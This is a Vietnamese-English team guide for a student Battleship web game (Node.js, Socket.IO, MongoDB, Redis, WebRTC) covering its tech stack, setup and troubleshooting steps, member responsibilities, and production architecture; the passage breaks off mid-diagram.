# Hướng Dẫn Team - Dự Án Battleship

**Nhóm:** Nhóm 3  
**Thành viên:** 5 người  
**Mục tiêu:** Hiểu rõ kiến trúc mạng, TCP/UDP, Socket.IO, WebRTC của game Battleship  
**GitHub:** https://github.com/nviethung23  
**Domain:** battleshipgame.fun

---

## 📚 TÀI LIỆU THAM KHẢO

1. **PROJECT_ANALYSIS.md** - Phân tích chi tiết toàn bộ project (15,000+ từ)
2. **NETWORK_STUDY_NOTES.md** - Note học tập về network (CỰC KỲ QUAN TRỌNG - đã update full!)
3. **File này (TEAM_GUIDE.md)** - Hướng dẫn phân chia công việc team

**📖 Đọc thêm trong NETWORK_STUDY_NOTES.md:**
- ✅ Nginx Reverse Proxy Configuration (chi tiết từng dòng config)
- ✅ SSL/TLS Deep Dive (TLS handshake, Let's Encrypt, certificates)
- ✅ 10 Kiến Thức Quan Trọng Cho Thi (TCP/UDP, WebSocket, WebRTC NAT, JWT, etc.)
- ✅ Checklist Ôn Thi (Lý thuyết + Kỹ thuật + Code + Demo)
- ✅ 10 Câu Hỏi Thường Gặp với đáp án mẫu

---

## 💻 CÔNG NGHỆ SỬ DỤNG (TECH STACK)

### 🎨 Frontend

#### Core Technologies
- **HTML5** - Semantic markup, Canvas API
- **CSS3** - Flexbox, Grid, Animations, Media Queries
- **JavaScript (ES6+)** - Vanilla JS (no framework)
  - Modules (`import/export`)
  - Async/Await
  - Promises
  - Arrow functions
  - Destructuring
  - Template literals

#### Client-Side Libraries
- **Socket.IO Client v4.6.1**
  - Real-time bidirectional communication
  - Auto-reconnection
  - Event-based messaging
  - Room support

- **WebRTC Native API**
  - `RTCPeerConnection` - P2P connection
  - `getUserMedia()` - Camera/Microphone access
  - `RTCDataChannel` - Data transfer
  - ICE (Interactive Connectivity Establishment)

#### UI/UX Features
- **Responsive Design** - Mobile, Tablet, Desktop
- **Character Selection System** - 8 unique characters
- **Ship Dock System** - Drag & drop ship placement
- **Real-time Chat** - In-game messaging
- **Voice Call UI** - Call controls, mute/unmute

---

### ⚙️ Backend

#### Runtime & Framework
- **Node.js v18.17.0+**
  - Event-driven architecture
  - Non-blocking I/O
  - Single-threaded with Event Loop
  - libuv thread pool (4 threads default)

- **Express.js v4.18.2**
  - Web framework
  - Middleware architecture
  - RESTful API routing
  - Static file serving

#### Real-time Communication
- **Socket.IO Server v4.6.1**
  - WebSocket with fallback (long-polling)
  - Room-based broadcasting
  - Custom event system
  - JWT authentication middleware
  - Namespace support

#### WebRTC Signaling
- **Custom WebRTC Handler**
  - SDP (Session Description Protocol) exchange
  - ICE candidate relay
  - Call state management
  - STUN server integration

---

### 🗄️ Database & Caching

#### Primary Database
- **MongoDB v8.0+ (MongoDB Atlas Cloud)**
  - NoSQL document database
  - Flexible schema
  - TTL (Time To Live) indexes
  - Geospatial queries (not used yet)
  - Collections:
    - `users` - User accounts (persistent)
    - `games` - Game history
    - `chatmessages` - Chat history (TTL 7 days)
    - `calllogs` - Call logs (TTL 30 days)

- **Mongoose ODM v8.0+**
  - Schema definition & validation
  - Middleware (pre/post hooks)
  - Virtual properties
  - Population (similar to JOIN)
  - Query builder

#### Cache & Session Store
- **Redis v4.7.0 (Local Instance)**
  - In-memory data structure store
  - Key-value storage
  - TTL (expire) support
  - Atomic operations
  - Use cases:
    - Game state cache (2 hours TTL)
    - Room code mapping
    - User connection status
    - Rate limiting counters

---

### 🔐 Security & Authentication

#### Authentication
- **JWT (JSON Web Token) v9.0.2**
  - Stateless authentication
  - HS256 algorithm (symmetric)
  - 7 days expiry
  - Payload: `{ id, username, isGuest }`

- **bcryptjs v2.4.3**
  - Password hashing
  - 10 salt rounds
  - Slow by design (anti-brute-force)

#### Security Middleware
- **Helmet v8.1.0**
  - Content Security Policy (CSP)
  - X-Frame-Options
  - X-Content-Type-Options
  - HTTPS enforcement (HSTS)

- **CORS v2.8.5**
  - Cross-Origin Resource Sharing
  - Currently: `origin: *` (should restrict in production)

- **express-rate-limit v8.2.0**
  - Rate limiting per IP
  - Auth endpoints: 50 requests/15min
  - API endpoints: 200 requests/15min

#### Input Validation
- **express-validator v7.3.0**
  - Schema validation
  - Sanitization (trim, escape)
  - Custom validators
  - Error formatting

---

### 🚀 Deployment & Infrastructure

#### Hosting
- **AWS EC2 (Ubuntu 22.04 LTS)**
  - t2.medium instance (or similar)
  - Elastic IP
  - Security Groups (port 80, 443, 22)

#### Reverse Proxy
- **Nginx v1.24+**
  - SSL/TLS termination
  - Reverse proxy to Node.js :3000
  - WebSocket proxy (`Upgrade` header)
  - Static file serving
  - Gzip compression
  - Rate limiting (optional)

#### SSL/TLS
- **Let's Encrypt (Certbot)**
  - Free SSL certificates
  - Auto-renewal (90 days → renew at 60)
  - ACME protocol
  - HTTP-01 challenge

#### Process Management
- **PM2 v5.3+**
  - Process manager for Node.js
  - Auto-restart on crash
  - Log management
  - Cluster mode support (not used yet)
  - Startup script

#### Domain & DNS
- **Custom Domain:** battleshipgame.fun
- **DNS:** Cloudflare or Route 53
- **A Record:** EC2 Elastic IP

---

### 🛠️ Development Tools

#### Package Management
- **npm v9.x**
  - Dependency management
  - Scripts (start, dev, test)
  - Lock file (package-lock.json)

#### Development Dependencies
- **nodemon v3.0.2**
  - Auto-restart on file changes
  - Watch mode for development

- **dotenv v16.3.1**
  - Environment variables (.env file)
  - Secrets management

#### Version Control
- **Git**
  - GitHub repository
  - Branch: main
  - .gitignore (node_modules, .env, logs)

---

### 📊 Tech Stack Summary (Quick Reference)

```
┌─────────────────────────────────────────────────────────┐
│                     TECH STACK                          │
├─────────────────────────────────────────────────────────┤
│ Frontend:                                               │
│   - HTML5, CSS3, Vanilla JavaScript (ES6+)             │
│   - Socket.IO Client v4.6                              │
│   - WebRTC Native API                                  │
├─────────────────────────────────────────────────────────┤
│ Backend:                                                │
│   - Node.js v18+ (Runtime)                             │
│   - Express.js v4.18 (Framework)                       │
│   - Socket.IO Server v4.6 (Real-time)                  │
├─────────────────────────────────────────────────────────┤
│ Database:                                               │
│   - MongoDB v8.0 + Mongoose (NoSQL)                    │
│   - Redis v4.7 (Cache)                                 │
├─────────────────────────────────────────────────────────┤
│ Security:                                               │
│   - JWT v9.0 (Auth)                                    │
│   - bcryptjs v2.4 (Hashing)                            │
│   - Helmet v8.1 (Headers)                              │
│   - express-validator v7.3 (Validation)                │
├─────────────────────────────────────────────────────────┤
│ Infrastructure:                                         │
│   - AWS EC2 (Ubuntu 22.04)                             │
│   - Nginx v1.24 (Reverse Proxy)                        │
│   - Let's Encrypt (SSL/TLS)                            │
│   - PM2 v5.3 (Process Manager)                         │
│   - Domain: battleshipgame.fun                         │
└─────────────────────────────────────────────────────────┘
```

---

### 🔍 Why These Technologies?

#### Why Node.js + Express?
- ✅ **JavaScript Fullstack** - Same language frontend/backend
- ✅ **Non-blocking I/O** - Good for real-time apps
- ✅ **NPM Ecosystem** - Huge library collection
- ✅ **Easy WebSocket** - Socket.IO integration
- ❌ **Single-threaded** - Need cluster for multi-core

#### Why Socket.IO (not pure WebSocket)?
- ✅ **Auto-reconnect** - Handle network blips
- ✅ **Room system** - Built-in broadcasting
- ✅ **Event abstraction** - Easier than raw messages
- ✅ **Fallback** - Long-polling if WebSocket fails
- ❌ **Overhead** - Slightly more bandwidth

#### Why MongoDB (not PostgreSQL)?
- ✅ **Flexible schema** - Easy to add fields
- ✅ **JSON-like** - Natural for JavaScript
- ✅ **TTL indexes** - Auto-delete old data
- ✅ **Cloud hosted** - MongoDB Atlas free tier
- ❌ **No ACID** - Weaker consistency guarantees

#### Why Redis?
- ✅ **In-memory** - Extremely fast (< 1ms)
- ✅ **TTL support** - Auto-expire game states
- ✅ **Simple** - Key-value store
- ❌ **Volatile** - Lost on restart (RDB helps)

#### Why Nginx (not just Node.js)?
- ✅ **SSL termination** - Offload crypto from Node.js
- ✅ **Static files** - Faster serving
- ✅ **Reverse proxy** - Can add load balancer
- ✅ **Battle-tested** - Industry standard
- ❌ **Complexity** - One more service to manage

#### Why Let's Encrypt (not paid SSL)?
- ✅ **Free** - $0/year
- ✅ **Auto-renewal** - Certbot handles it
- ✅ **Trusted** - All browsers trust
- ❌ **90 days** - Short expiry (but auto-renews)

---

### 📦 Complete package.json Dependencies

```json
{
  "dependencies": {
    "express": "^4.18.2",
    "socket.io": "^4.6.1",
    "mongoose": "^8.0.0",
    "redis": "^4.7.0",
    "jsonwebtoken": "^9.0.2",
    "bcryptjs": "^2.4.3",
    "helmet": "^8.1.0",
    "cors": "^2.8.5",
    "express-rate-limit": "^8.2.0",
    "express-validator": "^7.3.0",
    "dotenv": "^16.3.1"
  },
  "devDependencies": {
    "nodemon": "^3.0.2"
  }
}
```

---

### 🎯 Technology Learning Path (For Team)

**Priority 1 (Must Master):**
1. Node.js + Express basics
2. Socket.IO events & rooms
3. MongoDB + Mongoose CRUD
4. JWT authentication flow
5. Nginx reverse proxy concept

**Priority 2 (Should Understand):**
6. Redis caching strategy
7. WebRTC signaling flow
8. Security best practices
9. PM2 process management
10. SSL/TLS basics

**Priority 3 (Nice to Know):**
11. Event Loop internals
12. WebSocket protocol details
13. STUN/TURN/ICE deep dive
14. Nginx advanced config
15. MongoDB aggregation pipeline

---

## ⚡ YÊU CẦU HỆ THỐNG & CÀI ĐẶT

### 🔴 QUAN TRỌNG: Node.js ≠ Java!

**Node.js project KHÔNG CẦN JDK/Java!**

```
❌ KHÔNG CẦN:
- JDK (Java Development Kit)
- JRE (Java Runtime Environment)
- Java compiler
- Maven/Gradle

✅ CHỈ CẦN:
- Node.js runtime (bao gồm V8 JavaScript engine)
- npm (Node Package Manager - đi kèm Node.js)
```

**Giải thích:**
- **Node.js** = JavaScript runtime (built on Chrome's V8 engine)
- **Java/JDK** = Hoàn toàn khác, không liên quan
- Code viết bằng **JavaScript**, chạy trên **Node.js**, KHÔNG phải Java

---

### 💻 Yêu Cầu Cài Đặt (Development)

#### 1. **Node.js (BẮT BUỘC)**
```bash
# Check version:
node --version    # v18.17.0 or higher
npm --version     # v9.0.0 or higher

# Download: https://nodejs.org/
# Recommended: LTS version (Long Term Support)
```

**What Node.js includes:**
- ✅ Node.js runtime (execute JavaScript)
- ✅ npm (package manager)
- ✅ npx (package executor)

#### 2. **MongoDB (BẮT BUỘC - Database)**

**Option A: MongoDB Atlas (Cloud - RECOMMENDED)**
```
1. Sign up: https://www.mongodb.com/cloud/atlas
2. Create free cluster (M0 - 512MB)
3. Get connection string:
   mongodb+srv://<username>:<password>@cluster.mongodb.net/battleship
4. Add to .env file
```
- ✅ Free tier available
- ✅ No installation needed
- ✅ Auto-backup
- ❌ Requires internet

**Option B: MongoDB Local (Self-hosted)**
```bash
# Windows:
Download: https://www.mongodb.com/try/download/community
Install MongoDB Community Server

# macOS (Homebrew):
brew tap mongodb/brew
brew install mongodb-community

# Ubuntu:
sudo apt-get install -y mongodb-org

# Start service:
sudo systemctl start mongod
```

#### 3. **Redis (BẮT BUỘC - Cache)**

**Windows:**
```bash
# Option 1: WSL2 (Recommended)
wsl --install
sudo apt-get update
sudo apt-get install redis-server
redis-server

# Option 2: Memurai (Redis alternative for Windows)
Download: https://www.memurai.com/
```

**macOS:**
```bash
brew install redis
brew services start redis
```

**Ubuntu/Linux:**
```bash
sudo apt-get update
sudo apt-get install redis-server
sudo systemctl start redis
sudo systemctl enable redis
```

**Test Redis:**
```bash
redis-cli ping
# Should return: PONG
```

#### 4. **Git (RECOMMENDED - Version Control)**
```bash
# Check:
git --version

# Download: https://git-scm.com/downloads
```

---

### 📦 Cài Đặt Project (Step by Step)

#### Step 1: Clone Repository
```bash
git clone https://github.com/nviethung23/Battleship.git
cd Battleship
```

#### Step 2: Install Dependencies
```bash
npm install
# Cài đặt tất cả packages trong package.json
# Mất ~2-5 phút tùy tốc độ mạng
```

**What npm install does:**
- Đọc `package.json`
- Download tất cả dependencies từ npm registry
- Tạo `node_modules/` folder (~200MB)
- Tạo `package-lock.json` (version lock)

#### Step 3: Configure Environment Variables
```bash
# Tạo file .env trong root folder:
cp .env.example .env   # Nếu có file example
# Hoặc tạo mới:
```

**File .env (Required):**
```env
# Server
PORT=3000
NODE_ENV=development

# MongoDB (Cloud)
MONGODB_URI=mongodb+srv://<username>:<password>@cluster.mongodb.net/battleship

# Redis (Local)
REDIS_HOST=localhost
REDIS_PORT=6379

# JWT Secret (IMPORTANT: Change this!)
JWT_SECRET=your_super_secret_key_change_this_in_production_minimum_32_characters

# HTTPS (Development - Optional)
HTTPS_ENABLED=false
# CERT_PATH=./cert.pem
# KEY_PATH=./key.pem
```

**Security Notes:**
- ⚠️ **NEVER commit .env to Git** (add to .gitignore)
- ⚠️ JWT_SECRET phải >= 32 characters
- ⚠️ Production: Dùng strong random secret

#### Step 4: Start MongoDB (if local)
```bash
# Windows (WSL2):
sudo service mongod start

# macOS:
brew services start mongodb-community

# Ubuntu:
sudo systemctl start mongod

# Verify:
mongosh    # MongoDB shell
# or
mongo      # Legacy shell
```

#### Step 5: Start Redis (if local)
```bash
# Windows (WSL2):
sudo service redis-server start

# macOS:
brew services start redis

# Ubuntu:
sudo systemctl start redis

# Verify:
redis-cli ping    # Should return PONG
```

#### Step 6: Run Development Server
```bash
npm run dev
# or
npm start

# Output:
# Server running on http://localhost:3000
# MongoDB connected
# Redis connected
```

#### Step 7: Access Application
```
Browser: http://localhost:3000
- Index page: http://localhost:3000/
- Game page: http://localhost:3000/game.html
- Lobby: http://localhost:3000/lobby.html
```

---

### 🚀 Production Deployment (Additional Requirements)

#### 1. **PM2 (Process Manager)**
```bash
npm install -g pm2

# Start app:
pm2 start server.js --name battleship

# Manage:
pm2 status
pm2 logs
pm2 restart battleship
pm2 stop battleship
```

#### 2. **Nginx (Reverse Proxy)**
```bash
# Ubuntu:
sudo apt-get update
sudo apt-get install nginx

# Configure:
sudo nano /etc/nginx/sites-available/battleship

# Enable:
sudo ln -s /etc/nginx/sites-available/battleship /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx
```

#### 3. **Certbot (SSL/TLS)**
```bash
# Ubuntu:
sudo apt-get install certbot python3-certbot-nginx

# Generate certificate:
sudo certbot --nginx -d battleshipgame.fun -d www.battleshipgame.fun

# Auto-renewal (cron job added automatically)
sudo certbot renew --dry-run
```

#### 4. **Domain & DNS**
- Register domain (e.g., battleshipgame.fun)
- Point A record to server IP
- Wait for DNS propagation (~5-60 minutes)

---

### 🔧 Common Issues & Solutions

#### Issue 1: "npm install" fails
```bash
# Clear npm cache:
npm cache clean --force

# Delete node_modules and reinstall:
rm -rf node_modules package-lock.json
npm install

# If still fails, update npm:
npm install -g npm@latest
```

#### Issue 2: "Cannot connect to MongoDB"
```bash
# Check MongoDB running:
sudo systemctl status mongod

# Check connection string in .env
# Ensure IP whitelist in MongoDB Atlas (0.0.0.0/0 for dev)

# Test connection:
mongosh "mongodb+srv://..."
```

#### Issue 3: "Redis connection refused"
```bash
# Check Redis running:
redis-cli ping

# Start Redis:
sudo systemctl start redis

# Check port:
sudo netstat -tuln | grep 6379
```

#### Issue 4: "Port 3000 already in use"
```bash
# Find process using port:
lsof -i :3000        # macOS/Linux
netstat -ano | findstr :3000    # Windows

# Kill process:
kill -9 <PID>        # macOS/Linux
taskkill /PID <PID> /F    # Windows

# Or change PORT in .env
```

#### Issue 5: "JWT_SECRET not defined"
```bash
# Check .env file exists
ls -la .env

# Check .env loaded:
node -e "require('dotenv').config(); console.log(process.env.JWT_SECRET)"

# Add to .env:
echo "JWT_SECRET=your_secret_here" >> .env
```

---

### 📊 System Requirements Summary

#### Minimum (Development)
- **OS:** Windows 10/11, macOS 11+, Ubuntu 20.04+
- **RAM:** 4GB
- **CPU:** 2 cores
- **Disk:** 2GB free space
- **Internet:** Required (for MongoDB Atlas, npm install)

#### Recommended (Development)
- **OS:** Windows 11, macOS 13+, Ubuntu 22.04 LTS
- **RAM:** 8GB+
- **CPU:** 4 cores+
- **Disk:** 10GB free space (for node_modules, databases)
- **Internet:** Stable broadband

#### Production (AWS EC2)
- **Instance:** t2.medium (2 vCPU, 4GB RAM)
- **Storage:** 20GB EBS
- **Network:** Elastic IP, Security Groups (80, 443, 22)
- **OS:** Ubuntu 22.04 LTS

---

### 🎯 Pre-Run Checklist

**Before running `npm start`, verify:**

```bash
# 1. Node.js installed
✅ node --version    # v18+
✅ npm --version     # v9+

# 2. Dependencies installed
✅ ls node_modules   # Should exist

# 3. MongoDB running
✅ mongosh --version # or mongo --version
✅ mongosh           # Can connect

# 4. Redis running
✅ redis-cli ping    # Returns PONG

# 5. Environment configured
✅ cat .env          # File exists
✅ grep JWT_SECRET .env    # Secret defined

# 6. No port conflicts
✅ lsof -i :3000     # Empty (port free)

# 7. Firewall (if applicable)
✅ Port 3000 allowed in firewall
```

If all ✅ → Run `npm start` → Success! 🎉

---

### 💡 FAQ (Frequently Asked Questions)

**Q1: "Có cần cài Java không?"**
→ **KHÔNG!** Node.js ≠ Java. Project này 100% JavaScript.

**Q2: "Có cần JDK, Maven, Gradle không?"**
→ **KHÔNG!** Đó là Java tools. Chỉ cần Node.js + npm.

**Q3: "npm là gì? Có phải Maven của JavaScript?"**
→ **Đúng!** npm = Node Package Manager (tương tự Maven cho Java, pip cho Python)

**Q4: "node_modules folder 200MB là bình thường không?"**
→ **Có!** JavaScript dependencies thường lớn (có thể 100-500MB).

**Q5: "Có cần Python không?"**
→ **Không** (trừ khi có bcrypt native bindings - npm tự handle)

**Q6: "Có thể chạy trên Windows không?"**
→ **Có!** Nhưng Redis cần WSL2 hoặc Memurai.

**Q7: "MongoDB Atlas free có đủ không?"**
→ **Đủ** cho dev/testing (512MB, 10GB bandwidth/month)

**Q8: "Cần bao nhiêu RAM để chạy?"**
→ **Development:** 4GB minimum, 8GB recommended
→ **Production:** 2GB+ (depends on traffic)

**Q9: "Có thể chạy offline không?"**
→ **Không hoàn toàn.** MongoDB Atlas cần internet. Dùng local MongoDB để offline.

**Q10: "package-lock.json là gì? Có commit không?"**
→ **Lock file** chứa exact versions. **Nên commit** để team dùng cùng version.

---

## 👥 PHÂN CHIA CÔNG VIỆC (5 THÀNH VIÊN)

### 🟦 Member 1: HTTP API & Authentication
**Trách nhiệm:** REST API, JWT, validation, security

#### Kiến Thức Cần Nắm
- HTTP/HTTPS protocol (Request/Response)
- TCP socket cho HTTP
- JWT authentication
- Bcrypt password hashing
- Input validation & sanitization
- Rate limiting & CORS
- Security headers (Helmet)

#### Kiến Thức Bổ Sung (Infrastructure)
- **Nginx Reverse Proxy:** SSL termination, request forwarding
- **SSL/TLS:** How HTTPS works, Let's Encrypt
- **Headers:** X-Real-IP, X-Forwarded-For, X-Forwarded-Proto
- **Production vs Development:** HTTP localhost vs HTTPS domain

#### Files Cần Đọc
```
server/server.js          (lines 1-100: setup, middleware)
server/controllers/authController.js
server/middleware/auth.js
server/middleware/validation.js
client/js/auth.js
/etc/nginx/sites-available/battleship  (on server)
```

#### Nội Dung Trình Bày (10-15 phút)
1. **HTTP API Architecture**
   - REST endpoints: `/api/register`, `/api/login`, `/api/guest-login`
   - Request/Response flow diagram
   
2. **JWT Authentication**
   ```
   [Client] → POST /api/login → [Server validates] 
            ← JWT Token (7 days) ←
   [Client] → Requests with Bearer Token → [Middleware verify]
   ```

3. **Security Measures**
   - Bcrypt: Hash password với 10 rounds
   - Rate limiting: 50 requests/15min cho auth
   - Helmet: CSP headers
   - Validation: express-validator

4. **Demo Code**
   ```javascript
   // JWT generation
   const token = jwt.sign(
     { id: user._id, username: user.username },
     process.env.JWT_SECRET,
     { expiresIn: '7d' }
   );
   
   // Password hashing
   const hashedPassword = await bcrypt.hash(password, 10);
   ```

5. **Limitations & Improvements**
   - ❌ No refresh token → Implement refresh token
   - ❌ CORS open (`*`) → Restrict to domain
   - ❌ JWT_SECRET đổi = all users logout

6. **Infrastructure Flow (Production)**
   ```
   [Browser] → HTTPS (443) → [Nginx SSL Termination]
                            ↓ (decrypt)
                      HTTP (plaintext)
                            ↓
                      [Node.js :3000]
                            ↓
                    [Validate JWT, Process Request]
                            ↓
   [Browser] ← HTTPS ← [Nginx Encrypt] ← JSON Response
   ```

7. **Security Headers via Nginx**
   ```nginx
   # HSTS - Force HTTPS for 1 year
   add_header Strict-Transport-Security "max-age=31536000";
   
   # Prevent clickjacking
   add_header X-Frame-Options "SAMEORIGIN";
   
   # XSS protection
   add_header X-Content-Type-Options "nosniff";
   ```

---

### 🟩 Member 2: Socket.IO Core & Lobby/Room
**Trách nhiệm:** WebSocket, rooms, matchmaking, lobby flow

#### Kiến Thức Cần Nắm
- WebSocket protocol (upgrade từ HTTP)
- Socket.IO authentication
- Room-based broadcasting
- Event-driven architecture
- Matchmaking queue algorithm
- Lobby ready state management

#### Files Cần Đọc
```
server/server.js          (Socket.IO setup)
server/socket/gameHandler.js  (lines 1-500: rooms, queue)
client/js/shared/socket-shared.js
client/js/hub.js
client/js/lobby.js
```

#### Nội Dung Trình Bày (10-15 phút)
1. **WebSocket vs HTTP**
   | HTTP | WebSocket |
   |------|-----------|
   | Request/Response | Bidirectional |
   | Short-lived | Persistent |
   | Stateless | Stateful |

2. **Socket.IO Handshake**
   ```javascript
   // Client
   const socket = io({
     auth: { token: JWT_TOKEN }
   });
   
   // Server
   io.use((socket, next) => {
     jwt.verify(token, SECRET, (err, decoded) => {
       socket.userId = decoded.id;
       next();
     });
   });
   ```

3. **Matchmaking Flow**
   ```
   [Player A] → queue:join → [Queue: [A]]
   [Player B] → queue:join → [Queue: [A, B]]
                           ↓
                    [Match 2 players]
                           ↓
   [Both] ← match:found (roomId, opponent info) ←
   ```

4. **Room Broadcasting**
   ```javascript
   // Send to all in room
   io.to(roomId).emit('attack_result', data);
   
   // Send to opponent only
   socket.to(roomId).emit('player:disconnected', data);
   ```

5. **Lobby Ready System**
   ```
   [P1] → lobby:playerReady (true) → [Server]
   [P2] → lobby:playerReady (true) → [Server]
                                   ↓
                            [Both ready?]
                                   ↓
   [Both] ← lobby:bothReady ← lobby:countdown (60s) ←
   ```

6. **Key Events**
   - `queue:join`, `match:found`
   - `room:createPrivate`, `room:joinPrivate`
   - `lobby:playerReady`, `lobby:bothReady`

---

### 🟨 Member 3: Game Logic & Sync
**Trách nhiệm:** Server-authoritative game, turn system, timers, reconnect

#### Kiến Thức Cần Nắm
- Server-authoritative architecture (chống cheat)
- Turn-based game logic
- Timer synchronization
- Reconnect/rejoin mechanism
- Redis game state storage
- Game state validation

#### Files Cần Đọc
```
server/socket/gameHandler.js  (lines 500-1500: game logic)
server/utils/gameLogic.js
server/services/gameStateStore.js
client/js/game.js
client/js/battle.js
```

#### Nội Dung Trình Bày (10-15 phút)
1. **Server-Authoritative Model**
   ```
   [Client] → attack(row, col) → [Server]
                                    ↓
                          [Validate coordinates]
                          [Check correct turn]
                          [Check already hit?]
                          [Update game state]
                                    ↓
   [Both] ← attack_result (hit/miss/sunk) ←
   ```

2. **Ship Placement Validation**
   ```javascript
   validateShipPlacement(ships, board) {
     // 1. Check 5 ships (sizes: 2,3,3,4,5)
     // 2. Check positions trong board (0-9)
     // 3. Check không overlap
     // 4. Check alignment (horizontal/vertical)
   }
   ```

3. **Attack Flow**
   ```
   [Player A turn] → attack(5, 3) → [Server validates]
                                  ↓
                          [Check board[5][3]]
                                  ↓
                     [HIT] → Check ship sunk?
                          → Check game over?
                          → Switch turn or continue
                                  ↓
   [Both] ← attack_result + turn_changed ←
   ```

4. **Timer System**
   - **Deployment timer:** 120 seconds
   - **Turn timer:** 30 seconds per turn
   - Server broadcasts `deployment_timer_update` mỗi giây
   - Timeout → auto-deploy random hoặc forfeit

5. **Reconnect Logic**
   ```
   [Player disconnect] → [Server wait 2s grace period]
                      → [Check Redis status]
                      → [Emit player:disconnected if still offline]
   
   [Player reconnect] → rejoin_game(roomId) → [Server]
                      ← rejoin_game_success (full state) ←
                      → [Opponent] ← player:reconnected ←
   ```

6. **Redis Game State**
   ```javascript
   // Save to Redis (TTL 2 hours)
   await redis.set(
     `battleship:game:${roomId}`,
     JSON.stringify(gameState),
     'EX', 7200
   );
   ```

---

### 🟥 Member 4: Chat & Database
**Trách nhiệm:** Chat system, MongoDB models, data persistence

#### Kiến Thức Cần Nắm
- MongoDB schema design
- NoSQL vs SQL
- Chat message sanitization (XSS prevention)
- Pagination & history
- TTL indexes (auto-delete)
- Mongoose ODM

#### Files Cần Đọc
```
server/socket/chatHandler.js
server/models/User.js
server/models/Game.js
server/models/ChatMessage.js
server/models/CallLog.js
server/config/mongodb.js
client/js/chat.js
```

#### Nội Dung Trình Bày (10-15 phút)
1. **MongoDB Collections**
   ```
   ┌─────────────┐
   │   users     │  (username, password, stats, isGuest)
   └─────────────┘
   ┌─────────────┐
   │   games     │  (roomId, player1, player2, status)
   └─────────────┘
   ┌─────────────┐
   │chatmessages │  (roomId, userId, message, timestamp)
   └─────────────┘
   ┌─────────────┐
   │  calllogs   │  (roomId, callerId, calleeId, duration)
   └─────────────┘
   ```

2. **User Model Schema**
   ```javascript
   {
     username: { type: String, unique: true, required: true },
     email: { type: String, sparse: true },
     password: { type: String, required: true }, // bcrypt hashed
     isGuest: { type: Boolean, default: false },
     guestCreatedAt: { type: Date }, // TTL 24h
     stats: {
       gamesPlayed: Number,
       wins: Number,
       losses: Number
     }
   }
   ```

3. **Chat Flow**
   ```
   [Player] → chat_message(roomId, text) → [Server]
                                          ↓
                                  [Sanitize XSS]
                                  [Save to MongoDB]
                                          ↓
                            [Broadcast to room]
                                          ↓
   [All in room] ← chat_message (userId, message, timestamp) ←
   ```

4. **Chat Sanitization**
   ```javascript
   function sanitizeChatMessage(message) {
     return message
       .trim()
       .substring(0, 500) // Max 500 chars
       .replace(/</g, '&lt;')
       .replace(/>/g, '&gt;');
   }
   ```

5. **Chat History Pagination**
   ```javascript
   // Get last 50 messages before timestamp
   ChatMessage.find({ roomId })
     .sort({ timestamp: -1 })
     .limit(50)
     .skip(0)
   ```

6. **TTL Indexes (Auto-Delete)**
   ```javascript
   // Guest users: delete after 24h
   guestCreatedAt: { type: Date, index: { expires: '24h' } }
   
   // Chat messages: delete after 7 days
   createdAt: { type: Date, index: { expires: '7d' } }
   
   // Call logs: delete after 30 days
   createdAt: { type: Date, index: { expires: '30d' } }
   ```

---

### 🟪 Member 5: WebRTC
**Trách nhiệm:** Voice/video call, P2P connection, NAT traversal

#### Kiến Thức Cần Nắm
- WebRTC architecture
- ICE/STUN/TURN protocols
- SDP (Session Description Protocol)
- UDP vs TCP cho media
- Signaling vs Media transport
- NAT traversal challenges

#### Files Cần Đọc
```
server/socket/webrtcHandler.js
server/models/CallLog.js
client/js/webrtc.js
```

#### Nội Dung Trình Bày (10-15 phút)
1. **WebRTC Architecture**
   ```
   [Caller] ←──────────────────────────────→ [Callee]
             Signaling (Socket.IO - TCP)
             
   [Caller] ←══════════════════════════════→ [Callee]
             Media Stream (UDP - P2P)
   ```

2. **TCP vs UDP**
   | TCP (Signaling) | UDP (Media) |
   |-----------------|-------------|
   | Reliable | Unreliable |
   | Ordered | Unordered |
   | High latency | Low latency |
   | Used for: SDP, ICE | Used for: Audio/Video |

3. **Call Setup Flow**
   ```
   1. [Caller] → call_request → [Server] → [Callee]
   2. [Callee] → call_accepted → [Server] → [Caller]
   3. [Caller] → webrtc_offer (SDP) → [Server] → [Callee]
   4. [Callee] → webrtc_answer (SDP) → [Server] → [Caller]
   5. [Both] → webrtc_ice_candidate (x N) → [Server] → [Peer]
   6. ═══ P2P Media Stream Established (UDP) ═══
   ```

4. **STUN Configuration**
   ```javascript
   const configuration = {
     iceServers: [
       { urls: 'stun:stun.l.google.com:19302' },
       { urls: 'stun:stun1.l.google.com:19302' }
     ]
   };
   
   const pc = new RTCPeerConnection(configuration);
   ```

5. **SDP (Session Description Protocol)**
   ```
   Offer SDP (from caller):
   - Media capabilities (audio/video codecs)
   - Network info (IP candidates)
   - Security keys
   
   Answer SDP (from callee):
   - Agreed media parameters
   - Callee's network info
   ```

6. **ICE Candidates**
   ```javascript
   // Client discovers local IP/port and sends to peer
   pc.onicecandidate = (event) => {
     if (event.candidate) {
       socket.emit('webrtc_ice_candidate', {
         roomId,
         candidate: event.candidate
       });
     }
   };
   ```

7. **NAT Traversal Problem**
   ```
   [Client A]           [NAT/Firewall]         [Internet]
   192.168.1.100 ────→ 203.0.113.50:12345 ────→ ???
   
   Problem: Client B không biết public IP của A
   Solution: STUN server tells A's public IP
   
   ❌ Current issue: No TURN server
   → Call fails if both behind Symmetric NAT
   → Success rate ~70-80%
   ```

---

## 🎯 DEMO SCENARIO (Toàn Team)

---

## 🌐 INFRASTRUCTURE & DEPLOYMENT (Kiến Thức Bổ Sung)

### 📦 Production Architecture

```
┌─────────────────────────────────────────────────────────┐
│                     INTERNET                             │
└────────────────────┬────────────────────────────────────┘
                     │
                     │ HTTPS (443)
                     │ HTTP (80) → redirect to 443
                     ↓
         ┌───────────────────────────┐
         │   AWS EC2 (Ubuntu)        │
         │   battleshipgame.fun      │
         │                           │
         │  ┌─────────────────────┐  │
         │  │  Nginx :443         │  │ ← SSL Termination
         │  │  (Reverse Proxy)    │  │   (Let's Encrypt)
         │  └─────────┬───────────┘  │
         │            │ HTTP          │
         │            ↓               │
         │  ┌─────────────────────┐  │
         │  │  Node.js :3000      │  │
         │  │  (PM2 managed)      │  │
         │  │  - Express          │  │
         │  │  - Socket.IO        │  │
         │  └─────────┬───────────┘  │
         │            │               │
         │            ↓               │
         │  ┌─────────────────────┐  │
         │  │  Redis (Local)      │  │
         │  │  - Game state       │  │
         │  │  - Session cache    │  │
         │  └─────────────────────┘  │
         └────────────┬───────────────┘
                      │
                      │ Internet
                      ↓
         ┌─────────────────────────┐
         │   MongoDB Atlas         │
         │   (Cloud Database)      │
         │   - Users               │
